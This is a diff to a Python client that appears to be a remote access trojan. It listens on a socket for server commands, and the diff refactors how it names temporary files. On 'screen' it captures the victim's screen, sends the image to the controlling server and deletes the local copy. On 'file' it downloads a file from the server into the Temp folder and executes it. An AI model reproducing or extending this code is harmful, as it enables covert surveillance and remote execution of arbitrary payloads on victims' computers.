@@ -33,6 +33,16 @@ def Connect(): # Connect To Socket
     	time.sleep(3)
     	Connect()
 
+
+def RandomSg():
+
+	Random = string.ascii_uppercase + string.digits # Random String Settings
+
+	Random = ''.join(random.sample(Random*6, 6)) # Random String
+
+	return Random
+
+
 def ExecuteOrders():
 
     while True:
@@ -43,40 +53,33 @@ def ExecuteOrders():
 
             Data = Data.decode("utf-8")
 
+            Temp = os.getenv('Temp') # Get Temp Path
 
         except: # Reconnect
 
             Main()
 
             continue
-            
+
         if(Data == 'screen'): 
 
             try:
 
-                Random = string.ascii_uppercase + string.digits # Random String Settings
+            	Snapshot = ImageGrab.grab() # Taking Screenshot
 
-                Snapshot = ImageGrab.grab() # Taking Screenshot
+            	Path = Temp+"/"+RandomSg()+".jpg" # Path to save screenshot
 
-                Temp = os.getenv('Temp') # Get Temp Path
+            	Snapshot.save(Path) # Save screenshot
 
-                Random = ''.join(random.sample(Random*6, 6)) # Random String
-
-                Path = Temp+"/"+Random+".jpg" # Path to save screenshot
-
-                Snapshot.save(Path)
-
-                with open(Path, "rb") as F:
-
+            	with open(Path,"rb") as F:
                     Data = F.read() # Read File Bytes
-
                     S.sendall(Data) # Send the Screenshot
-
-                F.close() # Close The File
-
-                os.remove(Path) # Delete Screenshot after sending it to server
+                    
+            	F.close() # Close The File
+            	os.remove(Path) # Delete Screenshot after sending it to server
 
             except:
+
             	continue
 
 
@@ -86,17 +89,11 @@ def ExecuteOrders():
 
             	S.send(str.encode("file"))
 
-            	Ex = S.recv(1024)
+            	Ex = S.recv(1024).decode("utf-8") # File Extension
 
-            	Ex = Ex.decode("utf-8") # File Extension
+            	Path = Temp+"/"+RandomSg()+"."+Ex
 
-            	Temp = os.getenv('Temp') # Get Temp Path
-
-            	Random = string.ascii_uppercase + string.digits # Random String Settings
-
-            	Random = ''.join(random.sample(Random*6, 6)) # Random String
-
-            	F = open(Temp+"/"+Random+"."+Ex, "wb")
+            	F = open(Path, "wb")
 
             	while True:
 
@@ -112,9 +109,10 @@ def ExecuteOrders():
 
                         F.close() # Close File
 
-                        os.system('start '+Temp+"/"+Random+"."+Ex) # Execute File
+                        os.system('start '+Path) # Execute File
 
                         break
+
             except:
 
             	continue
